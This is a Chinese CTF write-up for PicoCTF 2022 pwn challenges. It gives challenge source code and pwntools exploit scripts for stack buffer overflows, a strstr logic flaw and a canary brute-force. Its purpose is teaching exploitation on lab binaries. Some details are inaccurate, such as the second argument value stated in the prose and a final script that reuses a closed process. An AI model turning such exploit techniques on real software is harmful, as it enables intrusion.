# PicoCTF 2022 部分题解 （updating）

## Pwn 部分

### Buffer Overflow 0

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
可以看到程序对`SIGSEGV`信号注册了信号处理函数，在发生任何的栈溢出时，信号处理函数就会直接输出`flag`文件的内容。
于是我们输入任意内容使之触发段错误即可。

### Buffer Overflow 1

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
本题是一个经典的栈溢出题目，通过`gets`函数的漏洞，覆盖`vuln`函数的返回地址，使之返回到函数`win`中，以获取字符串，
脚本如下。
```python
from pwn import *
p = process("./vuln")
p.writeline(b"a"*40 + b"b"*4 + p32(0x80491f6))
p.interactive()
```

### RPS

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>
#define WAIT 60

static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;

int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");
  
  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
      
    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```
本题是一个石头剪刀布游戏，其中漏洞点在
```clike
if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
```
的判断逻辑有误，程序只是检查是否是子字符串，于是可以通过输入`rockpaperscissors`绕过程序的判断，获胜5次即可得到
flag

### X-Sixty-What

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
本题是一个 64 位下的题目，利用方法也是通过 `gets` 函数的缓冲区溢出漏洞，控制 `vuln` 函数返回到 `flag`，

!> 本题中需要注意的一点是，反汇编后发现 `flag` 函数的首条指令是 `enbr64`，该指令源于 Intel 的控制流增强技术。
在Intel CET中，间接跳转的处理逻辑中被插入一段过程：将CPU状态从`DLE`切换成`WAIT_FOR_ENDBRANCH`。
在间接跳转之后查看下一条指令是不是`endbr64`。如果指令是`endbr64`指令，那么该指令会将CPU状态从
`WAIT_FOR_ENDBRANCH`恢复成`DLE`。另一方面，如果下一条指令不是`endbr64`，
说明程序可能被控制流劫持了，CPU就报错（#CP）。因为按照正确的逻辑，间接跳转后应该需要有一条对应的
`endbr64`指令来回应间接跳转，如果不是`endbr64`指令，那么程序控制流可能被劫持并前往其它地址
（其它任意地址上是以非`endbr64`开始的汇编代码）（涉及编译器兼容CPU新特性）

脚本如下：
```python
from pwn import *
p = process("./vuln")
p.writeline(b'a'*64 + b'a'*8 + p64(0x40123B))
p.interactive()
```

### Buffer Overflow 2

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
本题目在上几道题目的基础上增加了对 `win` 函数返回值的限制，程序要求首个参数的返回值为 `0xCAFEF00D`，
第二个参数的返回值为 `0xCAFEF00D`，我们在利用的过程中，只需要将正确的参数值放置在栈上即可，脚本如下
```python
from pwn import *
p = process('./vuln')
p.writeline(b'a'*104 + b'b'*4 + b'b'*4 + p32(0x8049296) + b'x'*4 + p32(0xcafef00d) + p32(0xf00df00d))
p.interactive()
```

### Buffer Overflow 3

题目源码
```clike
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```
出题人土制 canary 栈保护。土制的 canary 只有四个字节，同时是从文件读入，不会改变，这就给了我们爆破的机会。
同时，出题人设计的输入函数支持不同长度的输入，于是就可以一个字节一个字节地去尝试 canary 的值，脚本如下
```python
from pwn import *

def calcCanary():
	canary = b""

	for i in range(0,4):
		
		b = 0
		log.info('Start Testing Canary Bit at %d' % (i + 1))

		while b < 128:

			p = process('./vuln')
			p.recvuntil(b'> ')
			p.writeline(bytes('%d' % (65 + i), 'ascii'))
			p.recvuntil(b'Input> ')
			p.writeline(b'a'*64 + canary + p8(b))

			try:
				p.recvuntil(b"Ok... Now Where's the Flag?")

			except Exception as e:
				p.close()
				p.wait_for_close()
				b += 1
				continue

			p.close()
			p.wait_for_close()
			log.info('Bit %d is %d' % (i, b))
			canary += bytes(chr(b), 'ascii')
			break
	
	return canary



if __name__ == '__main__':
	canary = calcCanary()
	log.info('Canary Found')
	log.info(canary.decode('ascii'))        # canary = 'BiRd'

	p.writeline(b'88')
	p.writeline(b'a'*64 + canary + b'c'*12 + b's'*4 + p32(0x8049336))
	p.interactive()
```

## Reverse 部分